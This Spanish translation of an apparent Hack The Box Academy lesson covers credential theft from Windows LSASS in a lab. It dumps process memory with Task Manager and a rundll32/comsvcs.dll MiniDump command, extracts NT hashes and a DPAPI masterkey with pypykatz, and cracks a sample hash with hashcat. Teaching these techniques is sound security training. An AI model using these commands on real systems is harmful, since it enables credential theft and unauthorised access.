Además de obtener copias de la base de datos SAM para volcar y crackear hashes, también nos beneficiaremos de apuntar a LSASS. Como se discutió en la sección `Credential Storage` de este módulo, LSASS es un servicio crítico que juega un papel central en la gestión de credenciales y los procesos de autenticación en todos los sistemas operativos Windows.

![lsass Diagram](https://academy.hackthebox.com/storage/modules/147/lsassexe_diagram.png)

Al iniciar sesión, LSASS:

- Cachea credenciales localmente en memoria
- Crea [access tokens](https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens)
- Hace cumplir las políticas de seguridad
- Escribe en el [security log](https://docs.microsoft.com/en-us/windows/win32/eventlog/event-logging-security) de Windows

Veamos algunas de las técnicas y herramientas que podemos usar para volcar la memoria de LSASS y extraer credenciales de un objetivo que ejecuta Windows.

---

## Dumping LSASS Process Memory

Similar al proceso de atacar la base de datos SAM, con LSASS, sería prudente primero crear una copia del contenido de la memoria del proceso LSASS mediante la generación de un volcado de memoria. Crear un archivo de volcado nos permite extraer credenciales sin conexión usando nuestro host de ataque. Ten en cuenta que realizar ataques sin conexión nos da más flexibilidad en la velocidad de nuestro ataque y requiere menos tiempo en el sistema objetivo. Hay innumerables métodos que podemos usar para crear un volcado de memoria. Vamos a cubrir técnicas que se pueden realizar utilizando herramientas ya integradas en Windows.

### Task Manager Method

Con acceso a una sesión gráfica interactiva con el objetivo, podemos usar el administrador de tareas para crear un volcado de memoria. Esto requiere que:

![Task Manager Memory Dump](https://academy.hackthebox.com/storage/modules/147/taskmanagerdump.png)

`Open Task Manager` > `Select the Processes tab` > `Find & right click the Local Security Authority Process` > `Select Create dump file`

Se crea y guarda un archivo llamado `lsass.DMP` en:

```r
C:\Users\loggedonusersdirectory\AppData\Local\Temp
```

Este es el archivo que transferiremos a nuestro host de ataque. Podemos usar el método de transferencia de archivos discutido en la sección `Attacking SAM` de este módulo para transferir el archivo de volcado a nuestro host de ataque.

### Rundll32.exe & Comsvcs.dll Method

El método del Administrador de Tareas depende de que tengamos una sesión interactiva basada en GUI con un objetivo. Podemos usar un método alternativo para volcar la memoria del proceso LSASS a través de una utilidad de línea de comandos llamada [rundll32.exe](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/rundll32). Esta forma es más rápida que el método del Administrador de Tareas y más flexible porque podemos obtener una sesión de shell en un host de Windows con solo acceso a la línea de comandos. Es importante tener en cuenta que las herramientas antivirus modernas reconocen este método como actividad maliciosa.

Antes de emitir el comando para crear el archivo de volcado, debemos determinar qué ID de proceso (`PID`) está asignado a `lsass.exe`. Esto se puede hacer desde cmd o PowerShell:

### Finding LSASS PID in cmd

Desde cmd, podemos emitir el comando `tasklist /svc` y encontrar lsass.exe y su ID de proceso en el campo PID.

```r
C:\Windows\system32> tasklist /svc

Image Name                     PID Services
========================= ======== ============================================
System Idle Process              0 N/A
System                           4 N/A
Registry                        96 N/A
smss.exe                       344 N/A
csrss.exe                      432 N/A
wininit.exe                    508 N/A
csrss.exe                      520 N/A
winlogon.exe                   580 N/A
services.exe                   652 N/A
lsass.exe                      672 KeyIso, SamSs, VaultSvc
svchost.exe                    776 PlugPlay
svchost.exe                    804 BrokerInfrastructure, DcomLaunch, Power,
                                   SystemEventsBroker
fontdrvhost.exe                812 N/A
```

### Finding LSASS PID in PowerShell

Desde PowerShell, podemos emitir el comando `Get-Process lsass` y ver el ID del proceso en el campo `Id`.

```r
PS C:\Windows\system32> Get-Process lsass

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
   1260      21     4948      15396       2.56    672   0 lsass
```

Una vez que tengamos el PID asignado al proceso LSASS, podemos crear el archivo de volcado.

### Creating lsass.dmp using PowerShell

Con una sesión elevada de PowerShell, podemos emitir el siguiente comando para crear el archivo de volcado:

```r
PS C:\Windows\system32> rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
```

Con este comando, estamos ejecutando `rundll32.exe` para llamar a una función exportada de `comsvcs.dll` que también llama a la función MiniDumpWriteDump (`MiniDump`) para volcar la memoria del proceso LSASS a un directorio especificado (`C:\lsass.dmp`). Recuerda que la mayoría de las herramientas AV modernas reconocen esto como malicioso y evitan que se ejecute el comando. En estos casos, tendremos que considerar formas de evitar o desactivar la herramienta AV que enfrentamos. Las técnicas de evasión de AV están fuera del alcance de este módulo.

Si logramos ejecutar este comando y generar el archivo `lsass.dmp`, podemos proceder a transferir el archivo a nuestro equipo de ataque para intentar extraer cualquier credencial que pueda haber estado almacenada en la memoria del proceso LSASS.

Nota: Podemos usar el método de transferencia de archivos discutido en la sección Attacking SAM para obtener el archivo lsass.dmp del objetivo a nuestro host de ataque.

---

## Using Pypykatz to Extract Credentials

Una vez que tenemos el archivo de volcado en nuestro host de ataque, podemos usar una poderosa herramienta llamada [pypykatz](https://github.com/skelsec/pypykatz) para intentar extraer credenciales del archivo .dmp. Pypykatz es una implementación de Mimikatz escrita completamente en Python. El hecho de que esté escrita en Python nos permite ejecutarla en hosts de ataque basados en Linux. En el momento de escribir esto, Mimikatz solo se ejecuta en sistemas Windows, por lo que para usarlo, necesitaríamos usar un host de ataque de Windows o ejecutar Mimikatz directamente en el objetivo, lo cual no es un escenario ideal. Esto hace que Pypykatz sea una alternativa atractiva porque todo lo que necesitamos es una copia del archivo de volcado, y podemos ejecutarlo sin conexión desde nuestro host de ataque basado en Linux.

Recuerda que LSASS almacena credenciales que tienen sesiones de inicio de sesión activas en sistemas Windows. Cuando volcamos la memoria del proceso LSASS en el archivo, esencialmente tomamos una "instantánea" de lo que había en la memoria en ese momento. Si había sesiones de inicio de sesión activas, las credenciales utilizadas para establecerlas estarán presentes. Vamos a ejecutar Pypykatz contra el archivo de volcado y descubrirlo.

### Running Pypykatz

El comando inicia el uso de `pypykatz` para analizar los secretos ocultos en el volcado de memoria del proceso LSASS. Usamos `lsa` en el comando porque LSASS es un subsistema de `local security authority`, luego especificamos la fuente de datos como un archivo `minidump`, seguido de la ruta al archivo de volcado (`/home/peter/Documents/lsass.dmp`) almacenado en nuestro host de ataque. Pypykatz analiza el archivo de volcado y muestra los resultados:

```r
pypykatz lsa minidump /home/peter/Documents/lsass.dmp 

INFO:root:Parsing file /home/peter/Documents/lsass.dmp
FILE: ======== /home/peter/Documents/lsass.dmp =======
== LogonSession ==
authentication_id 1354633 (14ab89)
session_id 2
username bob
domainname DESKTOP-33E7O54
logon_server WIN-6T0C3J2V6HP
logon_time 2021-12-14T18:14:25.514306+00:00
sid S-1-5-21-4019466498-1700476312-3544718034-1001
luid 1354633
	== MSV ==
		Username: bob
		Domain: DESKTOP-33E7O54
		LM: NA
		NT: 64f12cddaa88057e06a81b54e73b949b
		SHA1: cba4e545b7ec918129725154b29f055e4cd5aea8
		DPAPI: NA
	== WDIGEST [14ab89]==
		username bob
		domainname DESKTOP-33E7O54
		password None
		password (hex)
	== Kerberos ==
		Username: bob
		Domain: DESKTOP-33E7O54
	== WDIG

EST [14ab89]==
		username bob
		domainname DESKTOP-33E7O54
		password None
		password (hex)
	== DPAPI [14ab89]==
		luid 1354633
		key_guid 3e1d1091-b792-45df-ab8e-c66af044d69b
		masterkey e8bc2faf77e7bd1891c0e49f0dea9d447a491107ef5b25b9929071f68db5b0d55bf05df5a474d9bd94d98be4b4ddb690e6d8307a86be6f81be0d554f195fba92
		sha1_masterkey 52e758b6120389898f7fae553ac8172b43221605

== LogonSession ==
authentication_id 1354581 (14ab55)
session_id 2
username bob
domainname DESKTOP-33E7O54
logon_server WIN-6T0C3J2V6HP
logon_time 2021-12-14T18:14:25.514306+00:00
sid S-1-5-21-4019466498-1700476312-3544718034-1001
luid 1354581
	== MSV ==
		Username: bob
		Domain: DESKTOP-33E7O54
		LM: NA
		NT: 64f12cddaa88057e06a81b54e73b949b
		SHA1: cba4e545b7ec918129725154b29f055e4cd5aea8
		DPAPI: NA
	== WDIGEST [14ab55]==
		username bob
		domainname DESKTOP-33E7O54
		password None
		password (hex)
	== Kerberos ==
		Username: bob
		Domain: DESKTOP-33E7O54
	== WDIGEST [14ab55]==
		username bob
		domainname DESKTOP-33E7O54
		password None
		password (hex)

== LogonSession ==
authentication_id 1343859 (148173)
session_id 2
username DWM-2
domainname Window Manager
logon_server 
logon_time 2021-12-14T18:14:25.248681+00:00
sid S-1-5-90-0-2
luid 1343859
	== WDIGEST [148173]==
		username WIN-6T0C3J2V6HP$
		domainname WORKGROUP
		password None
		password (hex)
	== WDIGEST [148173]==
		username WIN-6T0C3J2V6HP$
		domainname WORKGROUP
		password None
		password (hex)
```

Vamos a echar un vistazo más detallado a alguna de la información útil en la salida.

### MSV

```r
sid S-1-5-21-4019466498-1700476312-3544718034-1001
luid 1354633
	== MSV ==
		Username: bob
		Domain: DESKTOP-33E7O54
		LM: NA
		NT: 64f12cddaa88057e06a81b54e73b949b
		SHA1: cba4e545b7ec918129725154b29f055e4cd5aea8
		DPAPI: NA
```

[MSV](https://docs.microsoft.com/en-us/windows/win32/secauthn/msv1-0-authentication-package) es un paquete de autenticación en Windows que LSA llama para validar los intentos de inicio de sesión contra la base de datos SAM. Pypykatz extrajo el `SID`, `Username`, `Domain` e incluso los hashes de contraseña `NT` y `SHA1` asociados con la sesión de inicio de sesión del usuario bob almacenada en la memoria del proceso LSASS. Esto será útil en la etapa final de nuestro ataque cubierto al final de esta sección.

### WDIGEST

```r
	== WDIGEST [14ab89]==
		username bob
		domainname DESKTOP-33E7O54
		password None
		password (hex)
```

`WDIGEST` es un protocolo de autenticación más antiguo habilitado por defecto en `Windows XP` - `Windows 8` y `Windows Server 2003` - `Windows Server 2012`. LSASS cachea las credenciales usadas por WDIGEST en texto claro. Esto significa que si nos encontramos atacando un sistema Windows con WDIGEST habilitado, es muy probable que veamos una contraseña en texto claro. Los sistemas operativos Windows modernos tienen WDIGEST deshabilitado por defecto. Además, es importante notar que Microsoft lanzó una actualización de seguridad para los sistemas afectados por este problema con WDIGEST. Podemos estudiar los detalles de esa actualización de seguridad [aquí](https://msrc-blog.microsoft.com/2014/06/05/an-overview-of-kb2871997/).

### Kerberos

```r
	== Kerberos ==
		Username: bob
		Domain: DESKTOP-33E7O54
```

[Kerberos](https://web.mit.edu/kerberos/#what_is) es un protocolo de autenticación de red utilizado por Active Directory en entornos de dominio de Windows. A las cuentas de usuario de dominio se les otorgan tickets al autenticarse con Active Directory. Este ticket se usa para permitir al usuario acceder a recursos compartidos en la red a los que se le ha otorgado acceso sin necesidad de escribir sus credenciales cada vez. LSASS `cachea contraseñas`, `ekeys`, `tickets` y `pins` asociados con Kerberos. Es posible extraer estos de la memoria del proceso LSASS y usarlos para acceder a otros sistemas unidos al mismo dominio.

### DPAPI

```r
	== DPAPI [14ab89]==
		luid 1354633
		key_guid 3e1d1091-b792-45df-ab8e-c66af044d69b
		masterkey e8bc2faf77e7bd1891c0e49f0dea9d447a491107ef5b25b9929071f68db5b0d55bf05df5a474d9bd94d98be4b4ddb690e6d8307a86be6f81be0d554f195fba92
		sha1_masterkey 52e758b6120389898f7fae553ac8172b43221605
```

El Data Protection Application Programming Interface o [DPAPI](https://docs.microsoft.com/en-us/dotnet/standard/security/how-to-use-data-protection) es un conjunto de API en los sistemas operativos Windows utilizados para cifrar y descifrar blobs de datos DPAPI en función del usuario para las funciones del sistema operativo Windows y varias aplicaciones de terceros. Aquí hay solo algunos ejemplos de aplicaciones que usan DPAPI y para qué lo usan:

|Applications|Use of DPAPI|
|---|---|
|`Internet Explorer`|Datos de autocompletado de formularios de contraseña (nombre de usuario y contraseña para sitios guardados).|
|`Google Chrome`|Datos de autocompletado de formularios de contraseña (nombre de usuario y contraseña para sitios guardados).|
|`Outlook`|Contraseñas para cuentas de correo electrónico.|
|`Remote Desktop Connection`|Credenciales guardadas para conexiones a máquinas remotas.|
|`Credential Manager`|Credenciales guardadas para acceder a recursos compartidos, unirse a redes inalámbricas, VPNs y más.|

Mimikatz y Pypykatz pueden extraer la `masterkey` de DPAPI para el usuario que ha iniciado sesión cuyos datos están presentes en la memoria del proceso LSASS. Esta masterkey puede luego usarse para descifrar los secretos asociados con cada una de las aplicaciones que utilizan DPAPI y resultar en la captura de credenciales para varias cuentas. Las técnicas de ataque de DPAPI se cubren en mayor detalle en el módulo [Windows Privilege Escalation](https://academy.hackthebox.com/module/details/67).

### Cracking the NT Hash with Hashcat

Ahora podemos usar Hashcat para crackear el hash NT. En este ejemplo, solo encontramos un hash NT asociado con el usuario Bob, lo que significa que no necesitaremos crear una lista de hashes como lo hicimos en la sección `Attacking SAM` de este módulo. Después de configurar el modo en el comando, podemos pegar el hash, especificar una lista de palabras y luego crackear el hash.

```r
sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt

64f12cddaa88057e06a81b54e73b949b:Password1
```

Nuestro intento de crackeo se completa y nuestro ataque general puede considerarse un éxito.